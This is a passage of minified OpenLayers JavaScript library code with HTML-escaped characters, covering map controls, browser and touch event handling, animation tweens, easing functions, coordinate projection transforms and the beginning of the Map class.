b(a)};OpenLayers.Format.CSWGetRecords.DEFAULTS={version:"2.0.2"};OpenLayers.Control=OpenLayers.Class({id:null,map:null,div:null,type:null,allowSelection:!1,displayClass:"",title:"",autoActivate:!1,active:null,handlerOptions:null,handler:null,eventListeners:null,events:null,initialize:function(a){this.displayClass=this.CLASS_NAME.replace("OpenLayers.","ol").replace(/\./g,"");OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+ "_"))},destroy:function(){this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy(),this.events=null);this.eventListeners=null;this.handler&amp;&amp;(this.handler.destroy(),this.handler=null);if(this.handlers){for(var a in this.handlers)this.handlers.hasOwnProperty(a)&amp;&amp;"function"==typeof this.handlers[a].destroy&amp;&amp;this.handlers[a].destroy();this.handlers=null}this.map&amp;&amp;(this.map.removeControl(this),this.map=null);this.div=null},setMap:function(a){this.map=a;this.handler&amp;&amp; this.handler.setMap(a)},draw:function(a){null==this.div&amp;&amp;(this.div=OpenLayers.Util.createDiv(this.id),this.div.className=this.displayClass,this.allowSelection||(this.div.className+=" olControlNoSelect",this.div.setAttribute("unselectable","on",0),this.div.onselectstart=OpenLayers.Function.False),""!=this.title&amp;&amp;(this.div.title=this.title));null!=a&amp;&amp;(this.position=a.clone());this.moveTo(this.position);return this.div},moveTo:function(a){null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top= a.y+"px")},activate:function(){if(this.active)return!1;this.handler&amp;&amp;this.handler.activate();this.active=!0;this.map&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active");this.events.triggerEvent("activate");return!0},deactivate:function(){return this.active?(this.handler&amp;&amp;this.handler.deactivate(),this.active=!1,this.map&amp;&amp;OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active"),this.events.triggerEvent("deactivate"), !0):!1},CLASS_NAME:"OpenLayers.Control"});OpenLayers.Control.TYPE_BUTTON=1;OpenLayers.Control.TYPE_TOGGLE=2;OpenLayers.Control.TYPE_TOOL=3;OpenLayers.Event={observers:!1,KEY_SPACE:32,KEY_BACKSPACE:8,KEY_TAB:9,KEY_RETURN:13,KEY_ESC:27,KEY_LEFT:37,KEY_UP:38,KEY_RIGHT:39,KEY_DOWN:40,KEY_DELETE:46,element:function(a){return a.target||a.srcElement},isSingleTouch:function(a){return a.touches&amp;&amp;1==a.touches.length},isMultiTouch:function(a){return a.touches&amp;&amp;1&lt;a.touches.length},isLeftClick:function(a){return a.which&amp;&amp;1==a.which||a.button&amp;&amp;1==a.button},isRightClick:function(a){return a.which&amp;&amp;3==a.which||a.button&amp;&amp;2==a.button},stop:function(a, b){b||OpenLayers.Event.preventDefault(a);a.stopPropagation?a.stopPropagation():a.cancelBubble=!0},preventDefault:function(a){a.preventDefault?a.preventDefault():a.returnValue=!1},findElement:function(a,b){for(var c=OpenLayers.Event.element(a);c.parentNode&amp;&amp;(!c.tagName||c.tagName.toUpperCase()!=b.toUpperCase());)c=c.parentNode;return c},observe:function(a,b,c,d){a=OpenLayers.Util.getElement(a);d=d||!1;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.attachEvent)&amp;&amp;(b="keydown"); this.observers||(this.observers={});if(!a._eventCacheID){var e="eventCacheID_";a.id&amp;&amp;(e=a.id+"_"+e);a._eventCacheID=OpenLayers.Util.createUniqueID(e)}e=a._eventCacheID;this.observers[e]||(this.observers[e]=[]);this.observers[e].push({element:a,name:b,observer:c,useCapture:d});a.addEventListener?a.addEventListener(b,c,d):a.attachEvent&amp;&amp;a.attachEvent("on"+b,c)},stopObservingElement:function(a){a=OpenLayers.Util.getElement(a)._eventCacheID;this._removeElementObservers(OpenLayers.Event.observers[a])}, _removeElementObservers:function(a){if(a)for(var b=a.length-1;0&lt;=b;b--){var c=a[b];OpenLayers.Event.stopObserving.apply(this,[c.element,c.name,c.observer,c.useCapture])}},stopObserving:function(a,b,c,d){d=d||!1;a=OpenLayers.Util.getElement(a);var e=a._eventCacheID;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.detachEvent)&amp;&amp;(b="keydown");var f=!1,g=OpenLayers.Event.observers[e];if(g)for(var h=0;!f&amp;&amp;h&lt;g.length;){var k=g[h];if(k.name==b&amp;&amp;k.observer==c&amp;&amp;k.useCapture==d){g.splice(h, 1);0==g.length&amp;&amp;delete OpenLayers.Event.observers[e];f=!0;break}h++}f&amp;&amp;(a.removeEventListener?a.removeEventListener(b,c,d):a&amp;&amp;a.detachEvent&amp;&amp;a.detachEvent("on"+b,c));return f},unloadCache:function(){if(OpenLayers.Event&amp;&amp;OpenLayers.Event.observers){for(var a in OpenLayers.Event.observers)OpenLayers.Event._removeElementObservers.apply(this,[OpenLayers.Event.observers[a]]);OpenLayers.Event.observers=!1}},CLASS_NAME:"OpenLayers.Event"}; OpenLayers.Event.observe(window,"unload",OpenLayers.Event.unloadCache,!1); OpenLayers.Events=OpenLayers.Class({BROWSER_EVENTS:"mouseover mouseout mousedown mouseup mousemove click dblclick rightclick dblrightclick resize focus blur touchstart touchmove touchend keydown".split(" "),listeners:null,object:null,element:null,eventHandler:null,fallThrough:null,includeXY:!1,extensions:null,extensionCount:null,clearMouseListener:null,initialize:function(a,b,c,d,e){OpenLayers.Util.extend(this,e);this.object=a;this.fallThrough=d;this.listeners={};this.extensions={};this.extensionCount= {};this._msTouches=[];null!=b&amp;&amp;this.attachToElement(b)},destroy:function(){for(var a in this.extensions)"boolean"!==typeof this.extensions[a]&amp;&amp;this.extensions[a].destroy();this.extensions=null;this.element&amp;&amp;(OpenLayers.Event.stopObservingElement(this.element),this.element.hasScrollEvent&amp;&amp;OpenLayers.Event.stopObserving(window,"scroll",this.clearMouseListener));this.eventHandler=this.fallThrough=this.object=this.listeners=this.element=null},addEventType:function(a){},attachToElement:function(a){this.element? OpenLayers.Event.stopObservingElement(this.element):(this.eventHandler=OpenLayers.Function.bindAsEventListener(this.handleBrowserEvent,this),this.clearMouseListener=OpenLayers.Function.bind(this.clearMouseCache,this));this.element=a;for(var b=!!window.navigator.msMaxTouchPoints,c,d=0,e=this.BROWSER_EVENTS.length;d&lt;e;d++)c=this.BROWSER_EVENTS[d],OpenLayers.Event.observe(a,c,this.eventHandler),b&amp;&amp;0===c.indexOf("touch")&amp;&amp;this.addMsTouchListener(a,c,this.eventHandler);OpenLayers.Event.observe(a,"dragstart", OpenLayers.Event.stop)},on:function(a){for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.register(b,a.scope,a[b])},register:function(a,b,c,d){a in OpenLayers.Events&amp;&amp;!this.extensions[a]&amp;&amp;(this.extensions[a]=new OpenLayers.Events[a](this));if(null!=c){null==b&amp;&amp;(b=this.object);var e=this.listeners[a];e||(e=[],this.listeners[a]=e,this.extensionCount[a]=0);b={obj:b,func:c};d?(e.splice(this.extensionCount[a],0,b),"object"===typeof d&amp;&amp;d.extension&amp;&amp;this.extensionCount[a]++):e.push(b)}},registerPriority:function(a, b,c){this.register(a,b,c,!0)},un:function(a){for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.unregister(b,a.scope,a[b])},unregister:function(a,b,c){null==b&amp;&amp;(b=this.object);a=this.listeners[a];if(null!=a)for(var d=0,e=a.length;d&lt;e;d++)if(a[d].obj==b&amp;&amp;a[d].func==c){a.splice(d,1);break}},remove:function(a){null!=this.listeners[a]&amp;&amp;(this.listeners[a]=[])},triggerEvent:function(a,b){var c=this.listeners[a];if(c&amp;&amp;0!=c.length){null==b&amp;&amp;(b={});b.object=this.object;b.element=this.element;b.type||(b.type= a);for(var c=c.slice(),d,e=0,f=c.length;e&lt;f&amp;&amp;(d=c[e],d=d.func.apply(d.obj,[b]),void 0==d||!1!=d);e++);this.fallThrough||OpenLayers.Event.stop(b,!0);return d}},handleBrowserEvent:function(a){var b=a.type,c=this.listeners[b];if(c&amp;&amp;0!=c.length){if((c=a.touches)&amp;&amp;c[0]){for(var d=0,e=0,f=c.length,g,h=0;h&lt;f;++h)g=this.getTouchClientXY(c[h]),d+=g.clientX,e+=g.clientY;a.clientX=d/f;a.clientY=e/f}this.includeXY&amp;&amp;(a.xy=this.getMousePosition(a));this.triggerEvent(b,a)}},getTouchClientXY:function(a){var b=window.olMockWin|| window,c=b.pageXOffset,b=b.pageYOffset,d=a.clientX,e=a.clientY;if(0===a.pageY&amp;&amp;Math.floor(e)>Math.floor(a.pageY)||0===a.pageX&amp;&amp;Math.floor(d)>Math.floor(a.pageX))d-=c,e-=b;else if(e&lt;a.pageY-b||d&lt;a.pageX-c)d=a.pageX-c,e=a.pageY-b;a.olClientX=d;a.olClientY=e;return{clientX:d,clientY:e}},clearMouseCache:function(){this.element.scrolls=null;this.element.lefttop=null;this.element.offsets=null},getMousePosition:function(a){this.includeXY?this.element.hasScrollEvent||(OpenLayers.Event.observe(window,"scroll", this.clearMouseListener),this.element.hasScrollEvent=!0):this.clearMouseCache();if(!this.element.scrolls){var b=OpenLayers.Util.getViewportElement();this.element.scrolls=[window.pageXOffset||b.scrollLeft,window.pageYOffset||b.scrollTop]}this.element.lefttop||(this.element.lefttop=[document.documentElement.clientLeft||0,document.documentElement.clientTop||0]);this.element.offsets||(this.element.offsets=OpenLayers.Util.pagePosition(this.element));return new OpenLayers.Pixel(a.clientX+this.element.scrolls[0]- this.element.offsets[0]-this.element.lefttop[0],a.clientY+this.element.scrolls[1]-this.element.offsets[1]-this.element.lefttop[1])},addMsTouchListener:function(a,b,c){function d(a){c(OpenLayers.Util.applyDefaults({stopPropagation:function(){for(var a=e.length-1;0&lt;=a;--a)e[a].stopPropagation()},preventDefault:function(){for(var a=e.length-1;0&lt;=a;--a)e[a].preventDefault()},type:b},a))}var e=this._msTouches;switch(b){case "touchstart":return this.addMsTouchListenerStart(a,b,d);case "touchend":return this.addMsTouchListenerEnd(a, b,d);case "touchmove":return this.addMsTouchListenerMove(a,b,d);default:throw"Unknown touch event type";}},addMsTouchListenerStart:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerDown",function(a){for(var b=!1,g=0,h=d.length;g&lt;h;++g)if(d[g].pointerId==a.pointerId){b=!0;break}b||d.push(a);a.touches=d.slice();c(a)});OpenLayers.Event.observe(a,"MSPointerUp",function(a){for(var b=0,c=d.length;b&lt;c;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}})},addMsTouchListenerMove:function(a, b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerMove",function(a){if(a.pointerType!=a.MSPOINTER_TYPE_MOUSE||0!=a.buttons)if(1!=d.length||d[0].pageX!=a.pageX||d[0].pageY!=a.pageY){for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId){d[b]=a;break}a.touches=d.slice();c(a)}})},addMsTouchListenerEnd:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerUp",function(a){for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}a.touches= d.slice();c(a)})},CLASS_NAME:"OpenLayers.Events"});OpenLayers.Events.buttonclick=OpenLayers.Class({target:null,events:"mousedown mouseup click dblclick touchstart touchmove touchend keydown".split(" "),startRegEx:/^mousedown|touchstart$/,cancelRegEx:/^touchmove$/,completeRegEx:/^mouseup|touchend$/,initialize:function(a){this.target=a;for(a=this.events.length-1;0&lt;=a;--a)this.target.register(this.events[a],this,this.buttonClick,{extension:!0})},destroy:function(){for(var a=this.events.length-1;0&lt;=a;--a)this.target.unregister(this.events[a],this,this.buttonClick); delete this.target},getPressedButton:function(a){var b=3,c;do{if(OpenLayers.Element.hasClass(a,"olButton")){c=a;break}a=a.parentNode}while(0&lt;--b&amp;&amp;a);return c},ignore:function(a){var b=3,c=!1;do{if("a"===a.nodeName.toLowerCase()){c=!0;break}a=a.parentNode}while(0&lt;--b&amp;&amp;a);return c},buttonClick:function(a){var b=!0,c=OpenLayers.Event.element(a);if(c&amp;&amp;(OpenLayers.Event.isLeftClick(a)||!~a.type.indexOf("mouse")))if(c=this.getPressedButton(c)){if("keydown"===a.type)switch(a.keyCode){case OpenLayers.Event.KEY_RETURN:case OpenLayers.Event.KEY_SPACE:this.target.triggerEvent("buttonclick", {buttonElement:c}),OpenLayers.Event.stop(a),b=!1}else if(this.startEvt){if(this.completeRegEx.test(a.type)){var b=OpenLayers.Util.pagePosition(c),d=OpenLayers.Util.getViewportElement(),e=window.pageYOffset||d.scrollTop;b[0]-=window.pageXOffset||d.scrollLeft;b[1]-=e;this.target.triggerEvent("buttonclick",{buttonElement:c,buttonXY:{x:this.startEvt.clientX-b[0],y:this.startEvt.clientY-b[1]}})}this.cancelRegEx.test(a.type)&amp;&amp;delete this.startEvt;OpenLayers.Event.stop(a);b=!1}this.startRegEx.test(a.type)&amp;&amp; (this.startEvt=a,OpenLayers.Event.stop(a),b=!1)}else b=!this.ignore(OpenLayers.Event.element(a)),delete this.startEvt;return b}});OpenLayers.Util=OpenLayers.Util||{}; OpenLayers.Util.vendorPrefix=function(){function a(a){return a?a.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}).replace(/^ms-/,"-ms-"):null}function b(a,b){if(void 0===g[b]){var c,e=0,f=d.length,p="undefined"!==typeof a.cssText;for(g[b]=null;e&lt;f;e++)if((c=d[e])?(p||(c=c.toLowerCase()),c=c+b.charAt(0).toUpperCase()+b.slice(1)):c=b,void 0!==a[c]){g[b]=c;break}}return g[b]}function c(a){return b(e,a)}var d=["","O","ms","Moz","Webkit"],e=document.createElement("div").style,f={},g={};return{css:function(b){if(void 0=== f[b]){var d=b.replace(/(-[\s\S])/g,function(a){return a.charAt(1).toUpperCase()}),d=c(d);f[b]=a(d)}return f[b]},js:b,style:c,cssCache:f,jsCache:g}}();OpenLayers.Animation=function(a){var b=OpenLayers.Util.vendorPrefix.js(a,"requestAnimationFrame"),c=!!b,d=function(){var c=a[b]||function(b,c){a.setTimeout(b,16)};return function(b,d){c.apply(a,[b,d])}}(),e=0,f={};return{isNative:c,requestFrame:d,start:function(a,b,c){b=0&lt;b?b:Number.POSITIVE_INFINITY;var l=++e,m=+new Date;f[l]=function(){f[l]&amp;&amp;+new Date-m&lt;=b?(a(),f[l]&amp;&amp;d(f[l],c)):delete f[l]};d(f[l],c);return l},stop:function(a){delete f[a]}}}(window);OpenLayers.Tween=OpenLayers.Class({easing:null,begin:null,finish:null,duration:null,callbacks:null,time:null,minFrameRate:null,startTime:null,animationId:null,playing:!1,initialize:function(a){this.easing=a?a:OpenLayers.Easing.Expo.easeOut},start:function(a,b,c,d){this.playing=!0;this.begin=a;this.finish=b;this.duration=c;this.callbacks=d.callbacks;this.minFrameRate=d.minFrameRate||30;this.time=0;this.startTime=(new Date).getTime();OpenLayers.Animation.stop(this.animationId);this.animationId=null; this.callbacks&amp;&amp;this.callbacks.start&amp;&amp;this.callbacks.start.call(this,this.begin);this.animationId=OpenLayers.Animation.start(OpenLayers.Function.bind(this.play,this))},stop:function(){this.playing&amp;&amp;(this.callbacks&amp;&amp;this.callbacks.done&amp;&amp;this.callbacks.done.call(this,this.finish),OpenLayers.Animation.stop(this.animationId),this.animationId=null,this.playing=!1)},play:function(){var a={},b;for(b in this.begin){var c=this.begin[b],d=this.finish[b];if(null==c||null==d||isNaN(c)||isNaN(d))throw new TypeError("invalid value for Tween"); a[b]=this.easing.apply(this,[this.time,c,d-c,this.duration])}this.time++;this.callbacks&amp;&amp;this.callbacks.eachStep&amp;&amp;((new Date).getTime()-this.startTime)/this.time&lt;=1E3/this.minFrameRate&amp;&amp;this.callbacks.eachStep.call(this,a);this.time>this.duration&amp;&amp;this.stop()},CLASS_NAME:"OpenLayers.Tween"});OpenLayers.Easing={CLASS_NAME:"OpenLayers.Easing"};OpenLayers.Easing.Linear={easeIn:function(a,b,c,d){return c*a/d+b},easeOut:function(a,b,c,d){return c*a/d+b},easeInOut:function(a,b,c,d){return c*a/d+b},CLASS_NAME:"OpenLayers.Easing.Linear"}; OpenLayers.Easing.Expo={easeIn:function(a,b,c,d){return 0==a?b:c*Math.pow(2,10*(a/d-1))+b},easeOut:function(a,b,c,d){return a==d?b+c:c*(-Math.pow(2,-10*a/d)+1)+b},easeInOut:function(a,b,c,d){return 0==a?b:a==d?b+c:1>(a/=d/2)?c/2*Math.pow(2,10*(a-1))+b:c/2*(-Math.pow(2,-10*--a)+2)+b},CLASS_NAME:"OpenLayers.Easing.Expo"}; OpenLayers.Easing.Quad={easeIn:function(a,b,c,d){return c*(a/=d)*a+b},easeOut:function(a,b,c,d){return-c*(a/=d)*(a-2)+b},easeInOut:function(a,b,c,d){return 1>(a/=d/2)?c/2*a*a+b:-c/2*(--a*(a-2)-1)+b},CLASS_NAME:"OpenLayers.Easing.Quad"};OpenLayers.Projection=OpenLayers.Class({proj:null,projCode:null,titleRegEx:/\+title=[^\+]*/,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.projCode=a;"object"==typeof Proj4js&amp;&amp;(this.proj=new Proj4js.Proj(a))},getCode:function(){return this.proj?this.proj.srsCode:this.projCode},getUnits:function(){return this.proj?this.proj.units:null},toString:function(){return this.getCode()},equals:function(a){var b=!1;a&amp;&amp;(a instanceof OpenLayers.Projection||(a=new OpenLayers.Projection(a)),"object"== typeof Proj4js&amp;&amp;this.proj.defData&amp;&amp;a.proj.defData?b=this.proj.defData.replace(this.titleRegEx,"")==a.proj.defData.replace(this.titleRegEx,""):a.getCode&amp;&amp;(b=this.getCode(),a=a.getCode(),b=b==a||!!OpenLayers.Projection.transforms[b]&amp;&amp;OpenLayers.Projection.transforms[b][a]===OpenLayers.Projection.nullTransform));return b},destroy:function(){delete this.proj;delete this.projCode},CLASS_NAME:"OpenLayers.Projection"});OpenLayers.Projection.transforms={}; OpenLayers.Projection.defaults={"EPSG:4326":{units:"degrees",maxExtent:[-180,-90,180,90],yx:!0},"CRS:84":{units:"degrees",maxExtent:[-180,-90,180,90]},"EPSG:900913":{units:"m",maxExtent:[-2.003750834E7,-2.003750834E7,2.003750834E7,2.003750834E7]}}; OpenLayers.Projection.addTransform=function(a,b,c){if(c===OpenLayers.Projection.nullTransform){var d=OpenLayers.Projection.defaults[a];d&amp;&amp;!OpenLayers.Projection.defaults[b]&amp;&amp;(OpenLayers.Projection.defaults[b]=d)}OpenLayers.Projection.transforms[a]||(OpenLayers.Projection.transforms[a]={});OpenLayers.Projection.transforms[a][b]=c}; OpenLayers.Projection.transform=function(a,b,c){if(b&amp;&amp;c)if(b instanceof OpenLayers.Projection||(b=new OpenLayers.Projection(b)),c instanceof OpenLayers.Projection||(c=new OpenLayers.Projection(c)),b.proj&amp;&amp;c.proj)a=Proj4js.transform(b.proj,c.proj,a);else{b=b.getCode();c=c.getCode();var d=OpenLayers.Projection.transforms;if(d[b]&amp;&amp;d[b][c])d[b][c](a)}return a};OpenLayers.Projection.nullTransform=function(a){return a}; (function(){function a(a){a.x=180*a.x/d;a.y=180/Math.PI*(2*Math.atan(Math.exp(a.y/d*Math.PI))-Math.PI/2);return a}function b(a){a.x=a.x*d/180;var b=Math.log(Math.tan((90+a.y)*Math.PI/360))/Math.PI*d;a.y=Math.max(-2.003750834E7,Math.min(b,2.003750834E7));return a}function c(c,d){var e=OpenLayers.Projection.addTransform,f=OpenLayers.Projection.nullTransform,g,p,q,r,s;g=0;for(p=d.length;g&lt;p;++g)for(q=d[g],e(c,q,b),e(q,c,a),s=g+1;s&lt;p;++s)r=d[s],e(q,r,f),e(r,q,f)}var d=2.003750834E7,e=["EPSG:900913","EPSG:3857", "EPSG:102113","EPSG:102100"],f=["CRS:84","urn:ogc:def:crs:EPSG:6.6:4326","EPSG:4326"],g;for(g=e.length-1;0&lt;=g;--g)c(e[g],f);for(g=f.length-1;0&lt;=g;--g)c(f[g],e)})();OpenLayers.Map=OpenLayers.Class({Z_INDEX_BASE:{BaseLayer:100,Overlay:325,Feature:725,Popup:750,Control:1E3},id:null,fractionalZoom:!1,events:null,allOverlays:!1,div:null,dragging:!1,size:null,viewPortDiv:null,layerContainerOrigin:null,layerContainerDiv:null,layers:null,controls:null,popups:null,baseLayer:null,center:null,resolution:null,zoom:0,panRatio:1.5,options:null,tileSize:null,projection:"EPSG:4326",units:null,resolutions:null,maxResolution:null,minResolution:null,maxScale:null,minScale:null, maxExtent:null,minExtent:null,restrictedExtent:null,numZoomLevels:16,theme:null,displayProjection:null,fallThrough:!1,autoUpdateSize:!0,eventListeners:null,panTween:null,panMethod:OpenLayers.Easing.Expo.easeOut,panDuration:50,zoomTween:null,zoomMethod:OpenLayers.Easing.Quad.easeOut,zoomDuration:20,paddingForPopups:null,layerContainerOriginPx:null,minPx:null,maxPx:null,initialize:function(a,b){1===arguments.length&amp;&amp;"object"===typeof a&amp;&amp;(a=(b=a)&amp;&amp;b.div);this.tileSize=new OpenLayers.Size(OpenLayers.Map.TILE_WIDTH, OpenLayers.Map.TILE_HEIGHT);this.paddingForPopups=new OpenLayers.Bounds(15,15,15,15);this.theme=OpenLayers._getScriptLocation()+"theme/default/style.css";this.options=OpenLayers.Util.extend({},b);OpenLayers.Util.extend(this,b);OpenLayers.Util.applyDefaults(this,OpenLayers.Projection.defaults[this.projection instanceof OpenLayers.Projection?this.projection.projCode:this.projection]);!this.maxExtent||this.maxExtent instanceof OpenLayers.Bounds||(this.maxExtent=new OpenLayers.Bounds(this.maxExtent)); !this.minExtent||this.minExtent instanceof OpenLayers.Bounds||(this.minExtent=new OpenLayers.Bounds(this.minExtent));!this.restrictedExtent||this.restrictedExtent instanceof OpenLayers.Bounds||(this.restrictedExtent=new OpenLayers.Bounds(this.restrictedExtent));!this.center||this.center instanceof OpenLayers.LonLat||(this.center=new OpenLayers.LonLat(this.center));this.layers=[];this.id=OpenLayers.Util.createUniqueID("OpenLayers.Map_");this.div=OpenLayers.Util.getElement(a);this.div||(this.div=document.createElement("div"), this.div.style.height="1px",this.div.style.width="1px");OpenLayers.Element.addClass(this.div,"olMap");var c=this.id+"_OpenLayers_ViewPort";this.viewPortDiv=OpenLayers.Util.createDiv(c,null,null,null,"relative",null,"hidden");this.viewPortDiv.style.width="100%";this.viewPortDiv.style.height="100%";this.viewPortDiv.className="olMapViewport";this.div.appendChild(this.viewPortDiv);this.events=new OpenLayers.Events(this,this.viewPortDiv,null,this.fallThrough,{includeXY:!0});OpenLayers.TileManager&amp;&amp;null!== this.tileManager&amp;&amp;(this.tileManager instanceof OpenLayers.TileManager||(this.tileManager=new OpenLayers.TileManager(this.tileManager)),this.tileManager.addMap(this));c=this.id+"_OpenLayers_Container";this.layerContainerDiv=OpenLayers.Util.createDiv(c);this.layerContainerDiv.style.zIndex=this.Z_INDEX_BASE.Popup-1;this.layerContainerOriginPx={x:0,y:0};this.applyTransform();this.viewPortDiv.appendChild(this.layerContainerDiv);this.updateSize();if(this.eventListeners instanceof Object)this.events.on(this.eventListeners); !0===this.autoUpdateSize&amp;&amp;(this.updateSizeDestroy=OpenLayers.Function.bind(this.updateSize,this),OpenLayers.Event.observe(window,"resize",this.updateSizeDestroy));if(this.theme){for(var c=!0,d=document.getElementsByTagName("link"),e=0,f=d.length;e&lt;f;++e)if(OpenLayers.Util.isEquivalentUrl(d.item(e).href,this.theme)){c=!1;break}c&amp;&amp;(c=document.createElement("link"),c.setAttribute("rel","stylesheet"),c.setAttribute("type","text/css"),c.setAttribute("href",this.theme),document.getElementsByTagName("head")[0].appendChild(c))}null== this.controls&amp;&amp;(this.controls=[],null!=OpenLayers.Control&amp;&amp;(OpenLayers.Control.Navigation?this.controls.push(new OpenLayers.Control.Navigation):OpenLayers.Control.TouchNavigation&amp;&amp;this.controls.push(new OpenLayers.Control.TouchNavigation),OpenLayers.Control.Zoom?this.controls.push(new OpenLayers.Control.Zoom):OpenLayers.Control.PanZoom&amp;&amp;this.controls.push(new OpenLayers.Control.PanZoom),OpenLayers.Control.ArgParser&amp;&amp;this.controls.push(new OpenLayers.Control.ArgParser),OpenLayers.Control.Attribution&amp;&amp; this.controls.push(new OpenLayers.Control.Attribution)));e=0;for(f=this.controls.length;e&lt;f;e++)this.addControlToMap(this.controls[e]);this.popups=[];this.unloadDestroy=OpenLayers.Function.bind(this.destroy,this);OpenLayers.Event.observe(window,"unload",this.unloadDestroy);b&amp;&amp;b.layers&amp;&amp;(delete this.center,delete this.zoom,this.addLayers(b.layers),b.center&amp;&amp;!this.getCenter()&amp;&amp;this.setCenter(b.center,b.zoom));this.panMethod&amp;&amp;(this.panTween=new OpenLayers.Tween(this.panMethod));this.zoomMethod&amp;&amp;this.applyTransform.transform&amp;&amp; (this.zoomTween=new OpenLayers.Tween(this.zoomMethod))},getViewport:function(){return this.viewPortDiv},render:function(a){this.div=OpenLayers.Util.getElement(a);OpenLayers.Element.addClass(this.div,"olMap");this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);this.div.appendChild(this.viewPortDiv);this.updateSize()},unloadDestroy:null,updateSizeDestroy:null,destroy:function(){if(!this.unloadDestroy)return!1;this.panTween&amp;&amp;(this.panTween.stop(),this.panTween=null);this.zoomTween&amp;&amp;(this.zoomTween.stop(), this.zoomTween=null);OpenLayers.Event.stopObserving(window,"unload",this.unloadDestroy);this.unloadDestroy=null;this.updateSizeDestroy&amp;&amp;OpenLayers.Event.stopObserving(window,"resize",this.updateSizeDestroy);this.paddingForPopups=null;if(null!=this.controls){for(var a=this.controls.length-1;0&lt;=a;--a)this.controls[a].destroy();this.controls=null}if(null!=this.layers){for(a=this.layers.length-1;0&lt;=a;--a)this.layers[a].destroy(!1);this.layers=null}this.viewPortDiv&amp;&amp;this.viewPortDiv.parentNode&amp;&amp;this.viewPortDiv.parentNode.removeChild(this.viewPortDiv); this.viewPortDiv=null;this.tileManager&amp;&amp;(this.tileManager.removeMap(this),this.tileManager=null);this.eventListeners&amp;&amp;(this.events.un(this.eventListeners),this.eventListeners=null);this.events.destroy();this.options=this.events=null},setOptions:function(a){var b=this.minPx&amp;&amp;a.restrictedExtent!=this.restrictedExtent;OpenLayers.Util.extend(this,a);b&amp;&amp;this.moveTo(this.getCachedCenter(),this.zoom,{forceZoomChange:!0})},getTileSize:function(){return this.tileSize},getBy:function(a,b,c){var d="function"== typeof c.test;return OpenLayers.Array.filter(this[a],function(a){return a[b]==c||d&amp;&amp;c.test(a[b])})},getLayersBy:function(a,b){return this.getBy("layers",a,b)},getLayersByName:function(a){return this.getLayersBy("name",a)},getLayersByClass:function(a){return this.getLayersBy("CLASS_NAME",a)},getControlsBy:function(a,b){return this.getBy("controls",a,b)},getControlsByClass:function(a){return this.getControlsBy("CLASS_NAME",a)},getLayer:function(a){for(var b=null,c=0,d=this.layers.length;c&lt;d;c++){var e= this.layers[c];if(e.id==a){b=e;break}}return b},setLayerZIndex:function(a,b){a.setZIndex(this.Z_INDEX_BASE[a.isBaseLayer?"BaseLayer":"Overlay"]+5*b)},resetLayersZIndex:function(){for(var a=0,b=this.layers.length;a&lt;b;a++)this.setLayerZIndex(this.layers[a],a)},addLayer:function(a){for(var b=0,c=this.layers.length;b&lt;c;b++)if(this.layers[b]==a)return!1;if(!1===this.events.triggerEvent("preaddlayer",{layer:a}))return!1;this.allOverlays&amp;&amp;(a.isBaseLayer=!1);a.div.className="olLayerDiv";a.div.style.overflow= "";this.setLayerZIndex(a,this.layers.length);a.isFixed?this.viewPortDiv.appendChild(a.div):this.layerContainerDiv.appendChild(a.div);this.layers.push(a);a.setMap(this);a.isBaseLayer||this.allOverlays&amp;&amp;!this.baseLayer?null==this.baseLayer?this.setBaseLayer(a):a.setVisibility(!1):a.redraw();this.events.triggerEvent("addlayer",{layer:a});a.events.triggerEvent("added",{map:this,layer:a});a.afterAdd();return!0},addLayers:function(a){for(var b=0,c=a.length;b&lt;c;b++)this.addLayer(a[b])},removeLayer:function(a, b){if(!1!==this.events.triggerEvent("preremovelayer",{layer:a})){null==b&amp;&amp;(b=!0);a.isFixed?this.viewPortDiv.removeChild(a.div):this.layerContainerDiv.removeChild(a.div);OpenLayers.Util.removeItem(this.layers,a);a.removeMap(this);a.map=null;if(this.baseLayer==a&amp;&amp;(this.baseLayer=null,b))for(var c=0,d=this.layers.length;c&lt;d;c++){var e=this.layers[c];if(e.isBaseLayer||this.allOverlays){this.setBaseLayer(e);break}}this.resetLayersZIndex();this.events.triggerEvent("removelayer",{layer:a});a.events.triggerEvent("removed", {map:this,layer:a})}},getNumLayers:function(){return this.layers.length},getLayerIndex:function(a){return OpenLayers.Util.indexOf(this.layers,a)},setLayerIndex:function(a,b){var c=this.getLayerIndex(a);0>b?b=0:b>this.layers.length&amp;&amp;(b=this.layers.length);if(c!=b){this.layers.splice(c,1);this.layers.splice(b,0,a);for(var c=0,d=this.layers.length;c&lt;d;c++)this.setLayerZIndex(this.layers[c],c);this.events.triggerEvent("changelayer",{layer:a,property:"order"});this.allOverlays&amp;&amp;(0===b?this.setBaseLayer(a): this.baseLayer!==this.layers[0]&amp;&amp;this.setBaseLayer(this.layers[0]))}},raiseLayer:function(a,b){var c=this.getLayerIndex(a)+b;this.setLayerIndex(a,c)},setBaseLayer:function(a){if(a!=this.baseLayer&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers,a)){var 